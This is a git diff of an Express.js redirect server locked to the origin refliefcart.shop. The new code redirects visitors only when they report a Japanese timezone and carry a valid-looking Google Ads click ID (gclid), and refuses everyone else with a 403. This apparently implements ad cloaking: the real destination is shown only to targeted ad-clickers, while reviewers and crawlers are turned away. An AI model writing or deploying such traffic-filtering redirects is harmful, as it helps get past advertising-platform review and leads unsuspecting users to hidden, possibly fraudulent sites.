@@ -4,37 +4,61 @@ import cors from "cors";
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Force timezone to Japan
+// Server timezone (Render supports this)
 process.env.TZ = "Asia/Tokyo";
 
-// Allow access ONLY from refliefcart.shop
+// Allow ONLY refliefcart.shop
+const ALLOWED_ORIGIN = "https://refliefcart.shop";
+
 app.use(
   cors({
-    origin: "https://refliefcart.shop",
+    origin: ALLOWED_ORIGIN,
     methods: ["GET"],
-    allowedHeaders: ["Content-Type"]
+    allowedHeaders: ["Content-Type", "x-client-timezone"]
   })
 );
 
-// Optional: block all other origins explicitly
+// Hard block other origins
 app.use((req, res, next) => {
   const origin = req.headers.origin;
-  if (origin && origin !== "https://refliefcart.shop") {
-    return res.status(403).json({ error: "Forbidden" });
+  if (origin && origin !== ALLOWED_ORIGIN) {
+    return res.status(403).json({ error: "Forbidden origin" });
   }
   next();
 });
 
-// Redirect example.com
+// Basic gclid validation (Google Ads format)
+function isValidGclid(gclid) {
+  if (!gclid) return false;
+  return /^[A-Za-z0-9_-]{20,}$/.test(gclid);
+}
+
+// Main redirect logic
 app.get("/", (req, res) => {
-  res.redirect(302, "https://fooidemix.shop/map/latest");
+  const gclid = req.query.gclid || "";
+  const clientTimezone = req.headers["x-client-timezone"];
+
+  const isJapan = clientTimezone === "Asia/Tokyo";
+  const validGclid = isValidGclid(gclid);
+
+  if (isJapan && validGclid) {
+    return res.redirect(302, "https://example.com");
+  }
+
+  return res.status(403).json({
+    redirected: false,
+    reason: {
+      timezone: isJapan ? "ok" : "not_japan",
+      gclid: validGclid ? "ok" : "invalid"
+    }
+  });
 });
 
 // Health check
 app.get("/health", (req, res) => {
   res.json({
     status: "ok",
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    serverTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     time: new Date().toISOString()
   });
 });
